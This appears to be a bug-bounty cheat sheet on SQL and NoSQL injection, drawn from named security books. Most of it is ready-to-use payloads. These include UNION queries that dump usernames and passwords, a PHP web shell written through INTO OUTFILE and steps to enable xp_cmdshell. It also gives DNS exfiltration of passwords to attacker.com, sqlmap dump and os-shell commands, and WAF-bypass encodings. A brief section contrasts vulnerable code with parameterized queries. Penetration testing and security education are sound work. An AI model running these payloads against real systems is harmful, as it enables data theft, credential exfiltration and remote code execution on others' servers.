# SQL Injection
> Sources: Bug Bounty Bootcamp (Li), Real-World Bug Hunting (Yaworski), WSTG v4.2

## Types of SQLi

| Type | Description | Technique |
|---|---|---|
| Classic/In-band | Error or data in response | UNION, error-based |
| Blind Boolean | True/false response differences | AND 1=1 vs AND 1=2 |
| Blind Time-based | Response time differences | SLEEP(), WAITFOR |
| Out-of-band | DNS/HTTP exfiltration | xp_cmdshell, load_file |
| Second-order | Payload stored, fired later | Different request triggers it |

## Basic Detection

### Test Strings
```sql
'           -- single quote → syntax error
''          -- double quote (escape attempt)
`           -- backtick
)           -- close parenthesis
;           -- statement terminator
-- -        -- comment
#           -- MySQL comment
/**/        -- block comment
1' AND '1'='1
1' AND '1'='2
1 OR 1=1
' OR '1'='1
' OR 1=1--
' AND 1=1--   → true (normal response)
' AND 1=2--   → false (different/empty response)
```

### Error Indicators
```
You have an error in your SQL syntax
ORA-00933: SQL command not properly ended
Microsoft OLE DB Provider for SQL Server error
mysql_fetch_array() expects...
Unclosed quotation mark
```

---

## SQLi by Database Type

### MySQL
```sql
-- Version: SELECT @@version
-- Tables: SELECT table_name FROM information_schema.tables WHERE table_schema=database()
-- Columns: SELECT column_name FROM information_schema.columns WHERE table_name='users'
-- Data: SELECT username,password FROM users
-- File read: SELECT LOAD_FILE('/etc/passwd')
-- File write: SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'
-- Comment: -- , #, /**/
-- Time-based: 1' AND SLEEP(5)--
-- Error-based: ' AND extractvalue(1, concat(0x7e, (SELECT version())))--
```

### PostgreSQL
```sql
-- Version: SELECT version()
-- Tables: SELECT table_name FROM information_schema.tables WHERE table_schema='public'
-- File read: SELECT lo_get(lo_import('/etc/passwd'))
-- RCE (superuser): COPY (SELECT '') TO PROGRAM 'id > /tmp/out'
-- Time-based: '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
-- Comment: --
```

### MSSQL
```sql
-- Version: SELECT @@version
-- Tables: SELECT name FROM sysobjects WHERE xtype='U'
-- xp_cmdshell (if enabled): EXEC xp_cmdshell 'whoami'
-- Enable xp_cmdshell: EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-- Time-based: 1'; IF(1=1) WAITFOR DELAY '0:0:5'--
-- Error-based: ' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--
-- Stacked queries supported!
-- Comment: --
```

### Oracle
```sql
-- Version: SELECT banner FROM v$version
-- Tables: SELECT table_name FROM all_tables
-- Dual table (required): SELECT 1 FROM dual
-- Time-based: 1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--
-- Comment: --
```

### SQLite
```sql
-- Tables: SELECT name FROM sqlite_master WHERE type='table'
-- Comment: --
```

---

## UNION-Based SQLi

### Step 1: Determine Column Count
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    -- Continue until error

-- OR use UNION NULL method:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Step 2: Find Visible Column
```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

### Step 3: Extract Data
```sql
-- Database version
' UNION SELECT @@version--          -- MySQL/MSSQL
' UNION SELECT version()--          -- PostgreSQL
' UNION SELECT banner FROM v$version-- -- Oracle

-- List databases (MySQL)
' UNION SELECT schema_name FROM information_schema.schemata--

-- List tables
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

-- Extract data
' UNION SELECT username,password FROM users--
' UNION SELECT group_concat(username,':',password) FROM users--
' UNION SELECT username||':'||password FROM users--  -- Oracle
```

---

## Blind Boolean-Based SQLi

```sql
-- If page returns "Welcome" for true, "" for false:
1' AND SUBSTRING(username,1,1)='a'--
1' AND SUBSTRING(database(),1,1)>'m'--  -- Binary search

-- Using ASCII:
1' AND ASCII(SUBSTRING(username,1,1))>64--
1' AND ASCII(SUBSTRING(username,1,1))=97--  -- 97='a'
```

---

## Second-Order SQLi

Payload stored in DB, executed when another query uses it:
```
Step 1: Register with username: admin'--   (stored raw)
Step 2: Change password
Backend: UPDATE users SET password='x' WHERE username='admin'--'
Result: Resets admin password!
```

---

## NoSQL Injection (MongoDB)

```javascript
// Login bypass
{"username": "admin", "password": {"$gt": ""}}
// URL-encoded POST: username=admin&password[$gt]=

// Array injection:
?username=admin&password[]=anything

// Blind NoSQL:
?username[$regex]=^a   → check if username starts with 'a'
?username[$regex]=^ad  → check if starts with 'ad'

// $where (RCE in older MongoDB):
{"$where": "sleep(5000)"}
```

---

## Out-of-Band SQLi

### MySQL DNS Exfiltration
```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\test'))--
```

### MSSQL via xp_cmdshell
```sql
'; EXEC xp_cmdshell('nslookup ' + (SELECT TOP 1 password FROM users) + '.attacker.com')--
```

---

## SQLMap

```bash
# Basic scan
sqlmap -u "https://target.com/page?id=1" --dbs

# With cookies
sqlmap -u "https://target.com/page?id=1" --cookie="session=abc123" --dbs

# POST request
sqlmap -u "https://target.com/login" --data="username=admin&password=test" --dbs

# From Burp request file
sqlmap -r request.txt --dbs

# Extract tables → columns → data
sqlmap -u "..." -D dbname --tables
sqlmap -u "..." -D dbname -T users --columns
sqlmap -u "..." -D dbname -T users -C "username,password" --dump

# Try all techniques
sqlmap -u "..." --technique=BEUSTQ --level=5 --risk=3

# Bypass WAF
sqlmap -u "..." --tamper=space2comment,between,randomcase

# OS shell
sqlmap -u "..." --os-shell
```

---

## Filter/WAF Bypass

### Comment-Based Obfuscation
```sql
SELECT/**/username/**/FROM/**/users
SE/**/LECT username FROM users
```

### Case Variation
```sql
sElEcT uSeRnAmE fRoM uSeRs
```

### URL/Double Encoding
```sql
%53%45%4C%45%43%54  → SELECT
%2553%2545%254C%2545%2543%2554  → SELECT (double-encoded)
```

### Alternative Syntax
```sql
-- MySQL string concat via space:
'a' 'b'  → 'ab'
MID(username,1,1)='a'   -- MID() instead of SUBSTRING()
CHAR(97)='a'            -- CHAR() instead of string literals
```

---

## Code Review Patterns

### PHP (Vulnerable vs Safe)
```php
// Vulnerable
$query = "SELECT * FROM users WHERE id=" . $_GET['id'];
mysql_query($query);

// Safe
$stmt = $pdo->prepare("SELECT * FROM users WHERE id=?");
$stmt->execute([$_GET['id']]);
```

### Python (Vulnerable vs Safe)
```python
# Vulnerable
query = f"SELECT * FROM users WHERE name='{name}'"
cursor.execute(query)

# Safe
cursor.execute("SELECT * FROM users WHERE name=%s", (name,))
```

---

## Real-World Examples (Yaworski)
- **Yahoo! Sports** ($3,705): SQLi in API endpoint with verbose error messages
- **Uber** (partners portal): SQLi → accessed driver/trip data
- **Drupal "Drupalgeddon"**: Unauthenticated SQLi, mass-exploited

## Testing Checklist
- [ ] Test all URL parameters with `'`
- [ ] Test POST body, HTTP headers (User-Agent, X-Forwarded-For, Cookie)
- [ ] Test JSON API parameters
- [ ] Try UNION SELECT to determine columns
- [ ] Extract database name, tables, credentials
- [ ] Test NoSQL injection on MongoDB/Redis endpoints
- [ ] Try second-order injection via stored payloads
- [ ] Use sqlmap for automated exploitation

## Severity
- **High**: Read database content (passwords, PII)
- **Critical**: Write to DB, file read/write, OS command execution via xp_cmdshell/INTO OUTFILE
